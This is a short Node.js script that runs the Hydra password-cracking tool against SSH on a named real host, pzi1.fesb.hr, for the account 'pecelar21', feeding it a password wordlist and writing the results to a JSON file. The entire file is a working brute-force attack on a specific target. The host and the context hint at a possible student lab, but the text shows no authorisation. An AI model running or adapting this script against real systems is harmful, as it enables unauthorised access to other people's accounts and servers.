const execSh = require("exec-sh");
const targetIP = "pzi1.fesb.hr";
const targetPORT = "22";
const wordlistPath = "../lists/passList.txt";
const username = "pecelar21";
const {exec} = require('child_process')
const execute = require('child_process').exec

// const hydraCMD = `hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -t 4 -vV -o ./__data/hydra-result-TEST.json -b json`

function executeShellCMD() {
  return new Promise((resolve, reject) => {
    console.log("Client started Hydra! IP: ")
    execute(`hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -vV -o ./__data/hydra-result-test.json -b json`, (error, stdout, stderr) =>{
      if(error) console.warn(error)
      resolve(stdout ? stdout : stderr)
      console.log(stdout)
    })
  })
}
executeShellCMD()
